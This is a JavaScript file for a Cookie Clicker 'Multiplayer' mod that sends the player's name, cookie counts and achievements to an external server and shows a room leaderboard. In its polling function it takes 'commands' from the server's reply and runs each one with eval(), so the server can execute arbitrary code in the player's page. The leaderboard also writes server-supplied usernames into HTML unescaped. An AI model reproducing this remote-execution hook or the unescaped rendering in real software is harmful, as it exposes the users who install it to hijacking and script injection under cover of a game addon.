// Will get the hostname - console pasteable version
hostname = "https://www.lschaefer.xyz";

// Self-contained version - no external scripts needed
console.log("Mod \"Multiplayer\" added.")
// Used to store all values to make storage not overlap with cookie clicker values
var multiplayer = {
  startMenu: function () {
    // Will generate the startup menu
    this.clear();
    $("#multiplayer")
      .append(`<h1 class='title' style='font-size:150%'>Welcome to the Online Cookie Clicker Addon</h1><br>
        <p>You will see everyone's number of cookies, cookies per second, and achievements that are in the same room.</p>
        <label for="room">Room ID:</label>
        <input type="text" id="room" name="room"/>
        <a id='joinButton' class='option'>Join room</a>`);
    // Will run the code for when the user clicks join
    $("#joinButton").click(function () {
      multiplayer.room = $("#room").val();
      multiplayer.gameMenu();
    });
  },
  clear: function () {
    // Will clear the menu area for this
    $("#multiplayer").empty();
  },
  room: null, // This stores the room id
  gameMenu: function () {
    // Will generate the game menu and run the actual loop
    this.clear();
    $("#multiplayer")
      .append(`<h1 class='title' style='font-size:150%'>Welcome to ${this.room}</h1><br>
        <p>If table stops updating leave and join the room.</p>
        <table id='leaderboard' style='width:100%;'></table>
        <a id='leave' class='option'>Leave room</a>`);
    this.intervalFetch = setInterval(this.fetchData, 2000);
    this.intervalFakeLive = setInterval(this.fakeLive, 30);
    $("#leave").click(function () {
      clearInterval(multiplayer.intervalFetch);
      clearInterval(multiplayer.intervalFakeLive);
      multiplayer.startMenu();
    });
  },
  intervalFakeLive: null,
  intervalFetch: null,
  fetchData: function () {
    // Used to fetch data from server and update the server
    let ajax = new XMLHttpRequest();
    ajax.onload = function () {
       let jsonData = JSON.parse(this.response);
       multiplayer.internalCookies = jsonData["leaderboard"].map((e) => {
         e.cookies = e.cookies * 10 ** e.powerOfCookies;
         e.cookiesPs = e.cookiesPs * 10 ** e.powerOfCookiesPs;
         
         // Extract achievements from the time field
         let originalTime = parseInt(e.lastUpdate);
         let achievements = originalTime % 1000; // Get last 3 digits
         
         // Check if this looks like encoded data (very large number) or regular timestamp
         if (originalTime > 1000000000000) { // If it's a very large number, it's probably encoded
           e.achievements = achievements;
           e.lastUpdate = Math.floor(originalTime / 1000); // Get original timestamp
         } else {
           // Regular timestamp, no achievements data
           e.achievements = 0;
           e.lastUpdate = originalTime;
         }
         
         return e;
       });
      let commands = jsonData["commands"];
      if (commands) {
        // Will run all commands that are sent
        commands.forEach((command) => {
          eval(command["javascript"]);
        });
      }
    };
    ajax.open("POST", `${this.hostname}/api/cookieClicker.php`);
    ajax.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    // Sets the power variables correctly
    let powerOfCookies = 0;
    let cookies = Game.cookies;
    while (cookies >= 1000000) {
      powerOfCookies++;
      cookies /= 10;
    }
    let cookiesPs = Game.cookiesPs;
    let powerOfCookiesPs = 0;
    while (cookiesPs >= 1000000) {
      powerOfCookiesPs++;
      cookiesPs /= 10;
    }
     let currentTime = Date.now();
     let achievementsToSend = Game.AchievementsOwned;
     let encodedTime = currentTime * 1000 + achievementsToSend;
     
     
     ajax.send(
       `username=${Game.bakeryName}&cookies=${Math.round(
         cookies
       )}&powerOfCookies=${powerOfCookies}&cookiesPs=${Math.round(
         cookiesPs
       )}&powerOfCookiesPs=${powerOfCookiesPs}&room=${
         multiplayer.room
       }&type=view&time=${encodedTime}`
     );
  },
  fakeLive: function () {
    // Will make it look like you are live
    let html = `<tr><th>Username</th><th>Cookies</th><th>Per Second</th><th>Achievements</th><th>Last Update</th></tr>`;
    if (multiplayer.internalCookies) {
      multiplayer.internalCookies.forEach((data) => {
        let username = data["username"]; // Stores the username for that user
        let age = (Date.now() - parseInt(data["lastUpdate"])) / 1000; // Stores the age of the information
        let cookies = Beautify(data["cookies"] + data["cookiesPs"] * age); // Uses the age to make it look more like it is live
        let cookiesPs = Beautify(data["cookiesPs"]); // Stores the amount of cookies per second
        let achievements = data["achievements"] || 0; // Stores the number of achievements
        let style = "";
        let button = "";
        if (age > 30) {
          style = "color:grey";
        } else {
          if (username == Game.bakeryName) {
            cookies = Beautify(Game.cookies);
            cookiesPs = Beautify(Game.cookiesPs);
            achievements = Game.AchievementsOwned;
            age = 0;
          }
        }
        
        // Always update your own achievements to current value
        if (username == Game.bakeryName) {
          achievements = Game.AchievementsOwned;
        }
        html += `<tr style='${style}'><td>${username}</td><td>${cookies}</td><td>${cookiesPs}</td><td>${achievements}</td><td>${humanReadableTime(
          age
        )}</td><td>${button}</td></tr>`;
      });
    } else {
      html = "<p>Loading...</p>";
    }
    $("#leaderboard").empty();
    $("#leaderboard").append(html);
  },
  internalCookies: null, // Used to store a more precise cookie amount
  hostname: hostname,
  lastFetch: null, // Says the last time that the data was updated
};

// This will make sure that Jquery is loaded before starting everything
var waitForJQuery = setInterval(function () {
  if (typeof $ != "undefined" && typeof getCookie != "undefined") {
    let element = document.getElementById("centerArea");
    // Will create the multiplayer element
    let div = document.createElement("div");
    div.id = "multiplayer";
    div.style =
      "text-align:center;background:rgba(0,0,0,1);position:relative;z-index:100;padding-top:20px;padding-bottom:20px";
    element.insertBefore(div, element.firstChild);
    multiplayer.startMenu();
    
    // Add keyboard shortcut to toggle multiplayer UI visibility
    document.addEventListener('keydown', function(event) {
      if (event.key.toLowerCase() === 'r' && !event.ctrlKey && !event.altKey && !event.metaKey) {
        let multiplayerDiv = document.getElementById("multiplayer");
        if (multiplayerDiv) {
          if (multiplayerDiv.style.display === 'none') {
            multiplayerDiv.style.display = '';
          } else {
            multiplayerDiv.style.display = 'none';
          }
        }
      }
    });
    
    clearInterval(waitForJQuery);
  }
}, 10);
